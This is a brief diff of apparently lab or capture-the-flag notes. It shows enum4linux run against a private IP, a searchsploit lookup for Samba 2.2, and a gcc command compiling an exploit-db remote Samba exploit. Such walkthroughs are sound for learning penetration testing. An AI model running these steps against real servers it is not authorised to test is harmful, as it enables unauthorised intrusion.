@@ -1,7 +1,7 @@
 #### --Level 1-- 
 enum4linux      192.168.139.128
 
-***searchsploit Samba 2.2
+**** searchsploit Samba 2.2
 
 gcc /usr/share/exploitdb/exploits/multiple/remote/10.c -o exploitsamba
 
